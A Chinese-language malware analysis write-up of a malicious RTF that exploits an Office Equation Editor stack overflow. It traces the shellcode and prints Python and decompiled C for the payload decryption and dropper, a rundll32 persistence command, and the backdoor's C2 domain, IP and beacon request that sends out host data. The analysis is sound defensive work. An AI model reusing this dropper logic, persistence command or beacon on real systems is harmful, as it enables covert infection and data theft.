+    ![image](https://hackmd.io/_uploads/H1NNEE4p6.png)
+    :::danger
+    這個CVE是錯的，和EQNEDT32.EXE有關的CVE有三個:
+    CVE-2017-11882
+    CVE-2018-0802
+    CVE-2018-0798
+    所以其實不是目前的這一個，這也證明了我找超久都沒有找到的EQNEDT32.EXE的洞是哪裡
+    :::
+### 執行流程
+:::info
+因為這一題我是在已知漏洞CVE的前提下進行分析，所以我會先假裝在不知道的情況下，敘述我可能會如何分析，如果途中有某個地方是我不知道如何繼續進行或是某個background knowledge我一定先知道，我會標註其中
+:::
+:::danger
+因為不能使用線上sandbox tools，所以其實應該要有command sense是直接使用RTFOBJ進行Parsing，並且針對Embedded的File去OSINT他就可能可以不需要透過AnyRun知道他是哪一個CVE造成的惡意樣本
+:::
+1. Process Monitor
+    在執行一個可疑的file時，我會嘗試先用process monitor以及wireshark錄製其中盡可能詳細的所有過程(當然實行前一定要先snapshot)，然後看一下中間的過程有無觸及到CreateFile、WriteFiile以及registry這樣的操作
+    為了要更準確的filter不必要的紀錄，我設定的條件是:
+    1. Operation is WriteFile then Include
+    2. Process Name is Wireshark.exe then Exclude
+    3. Process Name is dumpcap.exe then Exclude
+    ![image](https://hackmd.io/_uploads/SJBQ2N4p6.png)
+    接著我就發現有一個==EQNEDT32.exe==的process寫了一個intel.wll的檔案到`C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll`
+    ![image](https://hackmd.io/_uploads/HJF9n44p6.png)
+    當然這也要有足夠的經驗才有辦法更準確的猜測這是一個可能有問題的操作，所以這一個process有一部分是參考網路上CVE的說明才更確定這個方向是對的
+2. Analyze EQNEDT32.exe
+    為了更進一步知道我的想法是否正確，所以我修改了我的filter rule→
+    1. Process Name is EQNEDT32.exe then Include
+    2. Process Name is Wireshark.exe then Exclude
+    3. Process Name is dumpcap.exe then Exclude
+    
+    發現有很多不同的process都有BoF的問題
+    ![image](https://hackmd.io/_uploads/SkNnCEN6a.png)
+    而直到比較後端的操作才出現CreateFile、WriteFile、CloseFile的操作，主要是
+    `C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll`和`C:\Users\REM\AppData\Local\Temp\8.t`
+    ![image](https://hackmd.io/_uploads/rkPe1HVa6.png)
+3. 所以，到目前為止可以很確定的事情是這個RTF File，裡面運藏了一些檔案，所以我打算針對這個file進行靜態的分析，但是我當然看不懂office針對RTF的語法和結構為何，所以根據[^rtf-wp1]的說明提到可以用[RTFOBJ](https://github.com/decalage2/oletools)這個tool，幫忙parse其中的內容，結果如下
+    ```bash
+    $ rtfobj -s all 5bbf2643a601e632a49406483c8f
+    c5262a76e206bd969f2ba3f4f2e238768ab9
+    rtfobj 0.60.1 on Python 3.8.17 - http://decalage.info/python/oletools
+    THIS IS WORK IN PROGRESS - Check updates regularly!
+    Please report any issue at https://github.com/decalage2/oletools/issues
+
+    ===============================================================================
+    File: '5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9' - size: 222012 bytes
+    ---+----------+---------------------------------------------------------------
+    id |index     |OLE Object
+    ---+----------+---------------------------------------------------------------
+    0  |0000E970h |format_id: 2 (Embedded)
+       |          |class name: b'Package'
+       |          |data size: 73928
+       |          |OLE Package object:
+       |          |Filename: '8.t'
+       |          |Source path: 'C:\\Aaa\\tmp\\8.t'
+       |          |Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t'
+       |          |MD5 = '8eac8203cf56f2b24753986353deac7e'
+       |          |File Type: Unknown file type
+    ---+----------+---------------------------------------------------------------
+    1  |00032B90h |format_id: 2 (Embedded)
+       |          |class name: b'Equation.2\x00\x124Vx\x90\x124VxvT2'
+       |          |data size: 6436
+       |          |MD5 = 'a09e82c26f94f3a9297377120503a678'
+    ---+----------+---------------------------------------------------------------
+    2  |00032B76h |Not a well-formed OLE object
+    ---+----------+---------------------------------------------------------------
+    Saving file from OLE Package in object #0:
+      Filename = '8.t'
+      Source path = 'C:\\Aaa\\tmp\\8.t'
+      Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t'
+      saving to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_8.t
+      md5 8eac8203cf56f2b24753986353deac7e
+    Saving file embedded in OLE object #1:
+      format_id  = 2
+      class name = b'Equation.2\x00\x124Vx\x90\x124VxvT2'
+      data size  = 6436
+      saving to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_object_00032B90.bin
+      md5 a09e82c26f94f3a9297377120503a678
+    Saving raw data in object #2:
+      saving object to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_object_00032B76.raw
+      md5 a3540560cf9b92c3bc4aa0ed52767b8a
+    ```
+    我發現其實內藏的檔案其實是`8.t`
+4. Analyze RTF Malware File
+    我想要跟一下這個RTF因為stack overflow的問題到底是怎麼變成RCE的，所以我先用Proess Monitor知道他會call到CreateFile這個API，因此我先用x32dbg attach eqnedt32.exe這個file，然後設定breakpoint到kernelbase.dll中的CreateFileA這個API
+    ![圖片](https://hackmd.io/_uploads/r12X9ZUpa.png)
+    接著我直接啟動malware file，dbg會停在CreateFile上，此時我回去看stack上的return address
+    ![圖片](https://hackmd.io/_uploads/rJzpc-ITp.png)
+    發現他會return到`026A878F`這個地方(每一次執行會不一樣，有點類似ASLR，不過通常會把要執行的shellcode放在`26AXXXX`開頭的地方)，這個位置存的應該就是他的shellcode
+    ![圖片](https://hackmd.io/_uploads/r1v_iWLpT.png)
+5. 詳細的分析怎麼做到這一步shellcode的
+    首先，我已經知道他是怎麼利用stack overflow的方式放上shellcode，但是我找了超久都還是沒有找到2016版本的漏洞在哪裡，應該說根據[^rtf-wp2]的說明，我知道因為在複製字體名稱的時候，沒有檢查字的長度，所以可以利用這一點蓋到return address，也就是說，可以讓程式跳到我們預先設定好的shellcode上面，那為什麼找不到他檢查長度的地方呢?因為我的做法是利用stack上的backtrace去看call完CreateFile之後要回到哪裡去判斷他是什麼時候篡改了return address，但跟完動態發現他似乎很早就已經把shellcode放上去了(只是什麼時候不太清楚)，所以礙於時間的關係，我先往下分析，詳細的流程如下:
+    ![圖片](https://hackmd.io/_uploads/H1r90hLap.png)
+    到最後他會到`0x430BFB`這個位置然後跳到`0x268A48C`，請注意看一下底下一點的code當中有一個`jmp 0x268A4BE`，這個一跳過去就會使dbg重新編譯過，這也是shellcode很常使用到的技巧
+    ![圖片](https://hackmd.io/_uploads/BJaheaI6T.png)
+    ![圖片](https://hackmd.io/_uploads/Sy7BbpLa6.png)
+    若順著這一條往下執行，他ret的地方就會變成，==0x26A6E8A==(當然每一次都不一樣，因為是動態的)
+    ![圖片](https://hackmd.io/_uploads/HJZhZpUap.png)
+    
+    ---
+    * 從這一段開始就是有關於呼叫windows API的部分，而且可以看到，剛跳過去的時候也是一樣call了==0x26A6E8E==，讓真正的shellcode藏在其中
+    ![圖片](https://hackmd.io/_uploads/SkDJf6Lpp.png)
+    
+    * Decrypt
+        這一段應該就是在decrypt後續的shellcode，可以看到他不斷loop做一件事情，那就是XOR目前取得的word bytes(0xC390)，總共應該做了0x8BA次，每次改2 Bytes
+        ![圖片](https://hackmd.io/_uploads/S1gLGp8ap.png)
+        可以看到decrypt後就真的能辨識一些字元
+        ![圖片](https://hackmd.io/_uploads/rJtgETLpT.png)
+        decrypt完的code截圖如下，這才是真正的shellcode
+        ![圖片](https://hackmd.io/_uploads/BJb9w6Lpp.png)
+    * 做的事情如下
+        1. 解析出`ntdll.dll`和`kernelbase.dll`
+            這一段很有趣，他應該就是我在[2023 Lab - WinMalware - Dynamic API Resolution Background](https://hackmd.io/@SBK6401/Bkd51XRM6)中學到的API Resolution技巧
+            > 不靠 loader，在 runtime 自行爬取系統結構，取得所需的 Windows API
+            
+            ![圖片](https://hackmd.io/_uploads/HygbsTU6T.png)
+            第一個使用的dll是`msvcrt.dll`，以此類推，我們可以把下一個function當作是在爬`kernel32.dll`
+            ![圖片](https://hackmd.io/_uploads/Syb5TpITT.png)
+        2. Fetch API
+            這個是我看到熟悉的老朋友→Magic Header(MZ和PE字樣)，其實這一段就是在fetch各個dll file的API(只要給定dll的file當作參數給這個function，就可以爬到想要的API)，我自己看到的總共有以下個: 
+            ```bash
+            GetProcAddresss->kernel32.dll
+            VirtualProtext->kernel32.dll
+            clearerr->ucrtbase.dll
+            CreateFileA->kernel32.dll
+            GetFileSize->kernel32.dll
+            ReadFile->kernel32.dll
+            WriteFile->kernel32.dll
+            CloseHandle->kernel32.dll
+            CreateProcessA->kernel32.dll
+            GetModuleFileNameA->kernel32.dll
+            ResumeThread->kernel32.dll
+            TerminateProcess->kernel32.dll
+            ---
+            GetThreadContext->kernel32.dll
+            ReadProcessMemory->kernel32.dll
+            GetModuleHandleA->kernel32.dll
+            WriteProcessMemory->kernel32.dll
+            SetThreadContext->kernel32.dll
+            ZwUnmapViewOfSection->ntdll.dll
+            ```
+            ![圖片](https://hackmd.io/_uploads/S108gJvTa.png)
+        3. CreateFile & VitualAlloc & Decrypt
+            Fetch完API後，他就Create `C:\Users\REM\AppData\Local\Temp\8.t`
+            ![圖片](https://hackmd.io/_uploads/HkCUTDda6.png)
+            並且取得他的大小後開一個同樣大小的空間給current process，接著他用ReadFile把讀取倒的所有內容放到該空間中
+            ![圖片](https://hackmd.io/_uploads/ryuB0vdTa.png)
+            取完資料後如下
+            ![圖片](https://hackmd.io/_uploads/Sk6wRvu6T.png)
+            ReadFile完後就開始解密原本的內容，詳細的解密過程如下(一整大段都是):
+            ![圖片](https://hackmd.io/_uploads/rJj2d_Op6.png)
+            :::spoiler Psudo Code
+            ```python!
+            from Crypto.Util.number import long_to_bytes
+            data = open('./5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_8.t', 'rb').read()
+            key = 0x48B53A6C
+            idx = 0
+            file_size = len(data)
+            decrypt_data = b""
+            if file_size > 0:
+                while idx < file_size:
+                    ebx = 7
+                    while ebx > 0:
+                        ecx = key >> 26
+                        ecx ^= key
+                        ecx >>= 3
+                        ecx ^= key
+                        key *= 2
+                        if key > 0x100000000:
+                            key -= 0x100000000
+                        ecx &= 1
+                        key |= ecx
+                        key += 1
+                        ebx -= 1
+                    decrypt_data += long_to_bytes(data[idx] ^ (key & 0xFF))
+
+                    idx += 1
+            open('./8.t_decrypt', 'wb').write(decrypt_data)
+            ```
+            :::
+        4. CreateFile & WriteFile
+            接著他創了`C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll`這個file必且寫上一些東西，其實就是我們剛剛decrypt的檔案
+            
+6. Analyze intel.wll
+    首先他先Decrypt儲存在內部的執行檔(有加密過的)，然後把他寫到
+    ```
+    C:\Users\REM\AppData\Local\Temp\taskhost.exe
+    ```
+    這個檔案中，解密就是一個了無新意的XOR，解密的code如下:
+    :::spoiler
+    ```c
+    void __cdecl CreateTask(LPCSTR lpFileName)
+    {
+      LPCVOID *lpBuffer; // edi
+      HANDLE FileA; // ebp
+      unsigned int i; // esi
+      unsigned int counter; // eax
+      _BYTE *v5; // ecx
+      DWORD NumberOfBytesWritten; // [esp+8h] [ebp-4h] BYREF
+                                                    // 寫到Task.exe的大小總共是0xB000，每一次寫16bytes(記得要從後面寫回來)，要寫2816次
+      lpBuffer = (LPCVOID *)operator new(16u);
+      FileA = CreateFileA(lpFileName, GENERIC_WRITE, 0, 0, CREATE_NEW, 0, 0);
+      if ( FileA != (HANDLE)-1 )
+      {
+        for ( i = 0; i < 2816; ++i )
+        {
+          counter = 0;
+          v5 = (char *)&Enc_Task_exe + 16 * i + 15;
+          do
+            *((_BYTE *)lpBuffer + counter++) = *v5-- ^ 6;
+          while ( counter < 0x10 );
+          WriteFile(FileA, lpBuffer, 0x10u, &NumberOfBytesWritten, 0);
+        }
+        operator delete(lpBuffer);
+        CloseHandle(FileA);
+      }
+    }
+    ```
+    :::
+    我簡單的寫了一個python script去驗證他，如下:
+    :::spoiler
+    ```python!
+    from Crypto.Util.number import long_to_bytes
+
+    BUFFER_SIZE = 16
+    num_iterations = 2816
+
+    lpBuffer = b""
+    unk_10005030 = open('Enc_Task_exe.txt', 'r').read().split(' ')
+    FileA = open('Dec_Task_exe.txt', 'wb')
+
+    # Loop through the iterations
+    for i in range(num_iterations):
+        counter = 15
+        while counter >= 0:
+            current_byte = unk_10005030[i * BUFFER_SIZE + counter]
+            lpBuffer += long_to_bytes(ord(bytes.fromhex(current_byte)) ^ 6)
+            counter -= 1
+
+    FileA.write(lpBuffer)
+    ```
+    :::
+    同時他也create了一個LNK file在
+    ```
+    C:\Users\REM\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WordPress.lnk
+    ```
+    詳細的c code如下
+    :::spoiler
+    ```clike!
+    void CreateLNK(char *a1, char *a2, char *a3, char *a4, ...)
+    {
+      void *v4; // ecx
+      bool v5; // sf
+      int v6; // edx
+      LPVOID ppv; // [esp+40h] [ebp-4h] BYREF
+      void *retaddr; // [esp+44h] [ebp+0h]
+      int v9; // [esp+58h] [ebp+14h]
+      va_list va; // [esp+5Ch] [ebp+18h] BYREF
+
+      va_start(va, a4);
+      v9 = va_arg(va, _DWORD);
+      ppv = v4;
+      if ( CoInitialize(0) >= 0 )
+      {
+        if ( CoCreateInstance(&rclsid, 0, 1u, &riid, &ppv) >= 0 )
+        {
+          (*(*ppv + 80))(ppv, a1, ppv);
+          (*(*retaddr + 44))(retaddr, a3);
+          (*(*retaddr + 68))(retaddr, v9, 0);
+          (*(*retaddr + 60))(retaddr, 7);
+          if ( (**retaddr)(retaddr, &unk_10004100, &a2) >= 0 )
+          {
+            v5 = (*(*a2 + 24))(a2, a4, 0) < 0;
+            ppv = a2;
+            v6 = *a2;
+            if ( !v5 )
+            {
+              (*(v6 + 8))();
+              (*(*ppv + 8))(ppv);
+              CoUninitialize();
+              return;
+            }
+            (*(v6 + 8))(ppv);
+          }
+          (*(*retaddr + 8))(retaddr);
+        }
+        CoUninitialize();
+      }
+    }
+    ```
+    :::
+    雖然看的不是很懂，但總之這個LNK內部儲存的東西如下，簡單來說就是用rundll32.exe跑剛剛解密的taskhost.exe:
+    ```
+    C:\WINDOWS\system32\rundll32.exe url.dll,FileProtocolHandler %TMP%\taskhost.exe
+    ```
+    只要打開內容看一下就知道了，當然如果可以用工具parse一下會更準確，但礙於時間的關係就先往下分析
+    ![圖片](https://hackmd.io/_uploads/HypaHtKa6.png)
+
+7. Analyze taskhost.exe
+    請查閱後門功能這個Section
+
+
+
+### 通訊協定
+因為我沒有實際架一個server讓他連線，所以我是直接錄一個失敗的connection，看他丟了什麼出來
+![圖片](https://hackmd.io/_uploads/rkwPnVcT6.png)
+:::danger
+如果之後還有時間可以想辦法架一個C2 Server，實際去構造連線的封包
+:::
+### 加解密演算法
+如上所述
+### 後門功能
+先說明一下這個後門在幹麻，順一下流程
+1. 在main function中實作了一個MD5 hash function，並且從0開始算直到符合`ef775988943825d2871e1cfa75473ec0`，其實這個就是99999999，我不太確定這一段為什麼要做這件事，可能的原因我想有兩個，其一是想要做到PoW的效果，其二是不想要太快執行到關鍵的地方，讓使用者可以放下戒心，但兩個原因都不太能說服自己就是了
+2. 接著他decode出了類似port的1228這個數字和C2 server name:==uacmoscow.com==，我不太確定這個1228是幹嘛的
+3. 接著進入到while loop想辦法fetch到電腦的一些資訊:
+    1. Local IP
+    2. OEM Code
+    3. Tick Count(從開機時間開始到現在過了多久)
+    4. 目前電腦的架構是多少
+    5. OS版本
+    6. Domain Name
+    7. Username
+    8. Computer Name
+    9. Proxy Server有無開啟
+4. 先組織好URI→`/ru/order/index.php?strPageID=2396956864`，以我的VM為例，我的IP是`192.168.222.142`，換算成hex就是`0x8edea8c0`
+5. 用base32 encode前面得到的所有電腦資訊，以我的VM為例: `KNFVIT2QFUZEGM2JKFEE6AYAKJCU2DYAIRCVGS2UJ5IC2MSDGNEVCSCPAAAAIABRGIZDQ===`
+6. 建構封包:
+    ```
+    Host: uacmoscow.com
+    Connection: keep-alive
+    Accept: */*
+    User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
+    Cookie: JSESSIONID=AHAKRXUOWUAQAAGUHPKAIAAAAAAAMAAAAABAAAAAAEHQARCFKNFVIT2QFUZEGM2JKFEE6AYAKJCU2DYAIRCVGS2UJ5IC2MSDGNEVCSCPAAAAIABRGIZDQ===
+    ```
+7. 嘗試用Get方式傳送出去，但是因為這個domain掛了，所以有關於連線的地方大部分都是靜態去看
+8. 如果連線成功他就可以執行以下幾件事情:
+    1. 獲取所有目前process的相關資訊後，利用Post傳送出去→`/xhome.native.page/datareader.php?sid=2396956864`
+    2. 終止Process
+    3. 開Shell
+    4. 從Server傳送資料到Local
+
+### 常駐方式
+目前我看到的部分就只有創了以下兩個檔案，前者是只要victim打開word就會觸發到的機置，後者則是當用戶登錄到 Windows 系統時，系統會自動檢查這個目錄，並運行其中的程序或快捷方式
+```
+C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll
+C:\Users\REM\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WordPress.lnk
+```
+
+## 中繼站
+### 基本資訊
+IP: `58.158.177.102`
+Domain: `uacmoscow.com`
+### 關連資訊
+該IP可能來源於日本
+![圖片](https://hackmd.io/_uploads/SyKjnVcTp.png)
+:::danger
+根據面試官的說明，這個IP已經被資安公司註冊了，變成如果有Victim連線到這個IP，資安公司就會直接通知，以便做後續的IR或是防止更大範圍的受害
+:::
+## 威脅情資
+### 攻擊者
+不確定
+### 攻擊時間
+不確定
+### 受害者
+不確定
+:::danger
+如果把RTF的內容實際打開去看裡面的內容，會發現是一個會議紀錄，如果再更詳細的OSINT可能可以針對這一點去看有可能的受害者是誰
+:::
+
+# Reference
+[Any.Run Analyze Phishing Mail](https://app.any.run/tasks/af6d9ed7-875e-43d9-a2ea-f3edadd32132/#)
+[某個以釣魚郵件發起的 APT 攻擊](https://ruhunglee.github.io/malware/ml01/)
+[^rtf]:[富文本格式](https://www.jendow.com.tw/wiki/%E5%AF%8C%E6%96%87%E6%9C%AC%E6%A0%BC%E5%BC%8F)
+[^xlam]:[什麼是XLAM文件擴展名？](https://www.solvusoft.com/en/file-extensions/file-extension-xlam/)
+[^vba]:[Excel如何查看VBA代码？](https://jingyan.baidu.com/article/d5c4b52b13c12c9b570dc507.html)
+[^vba-excel]:[ Excel教程小白必学技巧 20：调出开发工具选项卡 ](https://youtu.be/ZOALFkVau8c?si=N_Jp4k1NR15LZGDY)
+[^virustotla-cve-2017-11882]:[VirusTotal CVE-2017-11882](https://www.virustotal.com/gui/file/5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9/community)
+[^rtf-wp1]:[CVE-2017-11882 Office棧溢出漏洞分析](https://xz.aliyun.com/t/6668?time__1311=n4%2BxnD0DRDBGitDkDcexlhje0%3D06SOkShx7Ibx&alichlgref=https%3A%2F%2Fwww.google.com%2F)
+[^rtf-wp2]:[Office系列漏洞之CVE-2017-11882](https://www.freebuf.com/column/183551.html)
